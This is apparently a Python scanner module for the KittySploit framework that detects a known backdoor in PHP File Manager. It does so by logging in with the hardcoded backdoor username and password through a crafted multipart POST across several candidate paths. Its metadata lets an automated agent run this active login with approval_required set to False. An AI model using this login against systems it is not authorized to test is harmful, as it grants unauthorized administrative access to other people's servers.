#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP File Manager hardcoded backdoor credentials."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHP File Manager - Backdoor Login Detection',
        'description': (
            'Detects PHP File Manager backdoor account '
            '****__DO_NOT_REMOVE_THIS_ENTRY__**** / travan44 via multipart login.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'php', 'filemanager', 'backdoor', 'auth-bypass', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://sijmen.ruwhof.net/weblog/411-multiple-critical-security-vulnerabilities-including-a-backdoor-in-php-file-manager',
        ],
    }

    base_path = OptString('/php-file-manager', 'PHP File Manager base path', required=False)

    def run(self):
        base = str(self.base_path or '').strip().rstrip('/') or ''
        if base and not base.startswith('/'):
            base = '/' + base
        for prefix in (base, '', '/filemanager', '/phpfilemanager', '/fm'):
            if prefix is None:
                continue
            url = (prefix or '') + '/index.php'
            if not url.startswith('/'):
                url = '/' + url
            r0 = self.http_request(method='GET', path=url, allow_redirects=False)
            if not r0:
                continue
            cookie = None
            for k, v in r0.headers.items():
                if k.lower() == 'set-cookie' and 'PHPSESSID=' in v:
                    cookie = v.split(';')[0].strip()
                    break
            if not cookie:
                continue
            boundary = '----KSBoundary7f3a9c'
            body = (
                f'--{boundary}\r\n'
                'Content-Disposition: form-data; name="input_username"\r\n\r\n'
                '****__DO_NOT_REMOVE_THIS_ENTRY__****\r\n'
                f'--{boundary}\r\n'
                'Content-Disposition: form-data; name="input_password"\r\n\r\n'
                'travan44\r\n'
                f'--{boundary}\r\n'
                'Content-Disposition: form-data; name="logsub.x"\r\n\r\n'
                '48\r\n'
                f'--{boundary}\r\n'
                'Content-Disposition: form-data; name="logsub.y"\r\n\r\n'
                '11\r\n'
                f'--{boundary}--\r\n'
            )
            r = self.http_request(
                method='POST',
                path=url,
                data=body,
                headers={
                    'Cookie': cookie,
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                },
                allow_redirects=False,
            )
            if r and ('action=logout' in (r.text or '') or '/index.php?&amp;action=logout' in (r.text or '')):
                self.set_info(
                    severity='critical',
                    reason='PHP File Manager backdoor login',
                    path=url,
                )
                return True
        return False
